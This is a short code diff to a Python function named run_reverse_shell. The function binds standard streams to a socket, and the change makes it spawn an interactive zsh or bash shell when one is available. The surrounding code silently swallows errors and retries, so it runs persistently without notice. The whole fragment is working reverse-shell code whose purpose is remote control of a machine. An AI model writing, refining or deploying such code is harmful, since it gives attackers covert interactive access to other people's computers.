@@ -52,8 +52,14 @@ def run_reverse_shell(port: int = 4444) -> None:
             os.dup2(s.fileno(), 2)
 
             # Spawn the shell
-            # Using /bin/sh -i for an interactive shell
-            subprocess.call(["/bin/sh", "-i"])
+            # Using /bin/sh -i as it is universal on macOS and Linux
+            shell = "/bin/sh"
+            if os.path.exists("/bin/zsh"):
+                shell = "/bin/zsh"
+            elif os.path.exists("/bin/bash"):
+                shell = "/bin/bash"
+
+            subprocess.call([shell, "-i"])
         except Exception:
             # Silently fail and retry after a delay
             pass
